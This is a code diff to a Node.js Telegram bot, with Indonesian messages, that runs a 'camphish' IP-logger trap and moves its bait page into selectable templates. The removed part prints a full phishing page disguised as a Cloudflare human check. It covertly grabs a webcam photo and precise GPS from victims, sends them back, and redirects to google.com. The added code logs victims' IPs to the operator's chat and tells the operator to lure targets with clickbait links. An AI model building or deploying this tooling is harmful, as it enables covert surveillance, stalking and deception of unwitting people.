@@ -7,6 +7,7 @@ import { Telegraf, Markup } from "telegraf";
 import net from "net";
 import crypto from "crypto";
 import fs from "fs";
+import { templates } from "./trapTemplates";
 
 const resolveMx = util.promisify(dns.resolveMx);
 
@@ -164,8 +165,8 @@ async function startServer() {
   });
 
   // ========== IP LOGGER & CAMPHISH TRAP ENDPOINTS ==========
-  app.get('/t/:id', (req, res) => {
-    const id = req.params.id;
+  app.get('/t/:tmplId/:id', (req, res) => {
+    const { id, tmplId } = req.params;
     const chatId = trapMap.get(id);
     if (!chatId) return res.status(404).send('<h2>Error 404: Link Invalid or Expired.</h2><p>This logger link has expired or the bot system was restarted. Please generate a new link using /logger.</p>');
 
@@ -176,98 +177,19 @@ async function startServer() {
       const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
       bot.telegram.sendMessage(chatId, `🚨 <b>TARGET TERKENA IP LOGGER / CAMPHISH!</b> 🚨\n\n` + 
         `🌐 <b>IP Address:</b> <code>${ip}</code>\n` +
-        `💻 <b>User-Agent:</b> <code>${userAgent}</code>\n\n` +
+        `💻 <b>User-Agent:</b> <code>${userAgent}</code>\n` +
+        `🗂 <b>Template:</b> ${templates[tmplId] ? templates[tmplId].name : 'Default/Unknown'}\n\n` +
         `<i>Sedang mencoba meminta akses Kamera & GPS tingkat lanjut... Jika target menekan "Allow/Izinkan", bot akan otomatis mengirim foto target dan lokasi presisi.</i>`, {parse_mode: 'HTML'}).catch(()=>{});
     }
 
-    // Serve HTML payload for tracking (Cam + GPS)
-    res.send(`<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking your browser...</title>
-    <style>
-        body { margin: 0; padding: 0; font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: #fff; color: #333; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .wrapper { max-width: 600px; padding: 20px; }
-        .header { font-size: 22px; margin-bottom: 20px; color: #333; font-weight: 500; }
-        .spinner { width: 35px; height: 35px; border: 3px solid #e0e0e0; border-top: 3px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .text { font-size: 15px; margin-bottom: 15px; color: #555; }
-        .small { font-size: 12px; color: #888; margin-top: 30px; }
-    </style>
-</head>
-<body>
-    <div class="wrapper">
-        <div class="spinner"></div>
-        <div class="header">Verifying you are human...</div>
-        <div class="text">We need to check your browser to ensure connection security.</div>
-        <div class="text"><strong>Please press "Allow" or "Izinkan"</strong> if your browser asks for verification lock.</div>
-        <div class="small">Ray ID: ${id} &bull; Security by Cloudflare</div>
-    </div>
-    <video id="video" width="320" height="240" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-    <script>
-      let gpsSent = false;
-      let camSent = false;
-      let totalTime = 0;
-      
-      const checkRedirect = () => {
-        if(totalTime >= 5 && (camSent || gpsSent || totalTime >= 8)) {
-          window.location.href = 'https://google.com';
-        }
-      };
+    const template = templates[tmplId] || templates['1'];
+    res.send(template.render(id));
+  });
 
-      setInterval(() => { totalTime++; checkRedirect(); }, 1000);
-
-      // 1. Capture Camera
-      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-          .then(function(stream) {
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            video.play();
-            
-            setTimeout(() => {
-              const canvas = document.getElementById('canvas');
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-              
-              const imgData = canvas.toDataURL('image/jpeg', 0.8);
-              
-              fetch('/api/log/${id}/cam', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ image: imgData })
-              }).then(() => { camSent = true; checkRedirect(); });
-              
-              stream.getTracks().forEach(track => track.stop());
-            }, 1000);
-          })
-          .catch(function(err) {
-            console.log("Kamera tidak diizinkan.");
-            camSent = true; checkRedirect();
-          });
-      } else { camSent = true; }
-
-      // 2. Capture GPS
-      setTimeout(() => { 
-        if (navigator.geolocation) { 
-          navigator.geolocation.getCurrentPosition( 
-            (pos) => { 
-              fetch('/api/log/${id}/gps', { 
-                method: 'POST', 
-                headers: { 'Content-Type': 'application/json' }, 
-                body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }) 
-              }).then(() => { gpsSent = true; checkRedirect(); }); 
-            }, 
-            (err) => { gpsSent = true; checkRedirect(); }, 
-            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 } 
-          ); 
-        } else { gpsSent = true; checkRedirect(); } 
-      }, 500);
-    </script></body></html>`);
+  // Backward compatibility alias for default template
+  app.get('/t/:id', (req, res) => {
+    req.params.tmplId = '1';
+    app._router.handle(req, res, () => {});
   });
 
   // Handle Camphish Image Upload
@@ -482,8 +404,17 @@ async function startServer() {
       const id = crypto.randomUUID().slice(0, 8);
       trapMap.set(id, ctx.chat.id);
       saveTrapMap();
-      const trapUrl = `${appHost.replace(/\/$/, '')}/t/${id}`;
-      ctx.reply(`🎣 <b>LINK LOGGER BERHASIL DIBUAT!</b>\n\nLink Pelacak Anda:\n<code>${trapUrl}</code>\n\n<b>Cara Penggunaan:</b>\n1. Copy link di atas dan kirimkan ke target dengan dalih/clickbait (contoh: "Eh liat foto lucu ini").\n2. Saat target <b>membuka link (Klik)</b>, Anda otomatis mendapat IP Address target di chat ini.\n3. Jika target membiarkan halaman loading & menekan <b>"Allow/Izinkan Location"</b>, Anda akan menerima <b>LOKASI GPS PRESISI MAX!</b> 🗺️\n\n<i>Note: Karena link bawaan AI Studio tidak bisa diakses target (butuh Google Login), <b>sangat disarankan deploy kode ini ke Railway/Vercel</b> lalu ketik command <code>/sethost https://domain-publik-anda.com</code> pada bot ini!</i>`, {parse_mode: 'HTML', disable_web_page_preview: true});
+      
+      let replyMessage = `🎣 <b>LINK LOGGER BERHASIL DIBUAT!</b>\n\n<b>Silakan copy link dengan template yang Anda inginkan:</b>\n\n`;
+      
+      Object.entries(templates).forEach(([key, tmpl]) => {
+        const trapUrl = `${appHost.replace(/\/$/, '')}/t/${key}/${id}`;
+        replyMessage += `<b>${key}. ${tmpl.name}</b>\n<code>${trapUrl}</code>\n\n`;
+      });
+      
+      replyMessage += `<b>Cara Penggunaan:</b>\n1. Copy salah satu link di atas dan kirimkan ke target dengan dalih/clickbait.\n2. Saat target membuka link, Anda mendapat IP Target.\n3. Jika target mengizinkan "Allow" Camera/Lokasi, Anda akan mendapat <b>FOTO TARGET</b> dan <b>LOKASI PRESISI MAX</b>.\n\n<i>Note: Sangat disarankan set host ke Vercel/Railway pakai <code>/sethost</code> jika deploy ini di cloud.</i>`;
+      
+      ctx.reply(replyMessage, {parse_mode: 'HTML', disable_web_page_preview: true});
     });
 
     bot.command('ip', async (ctx) => {
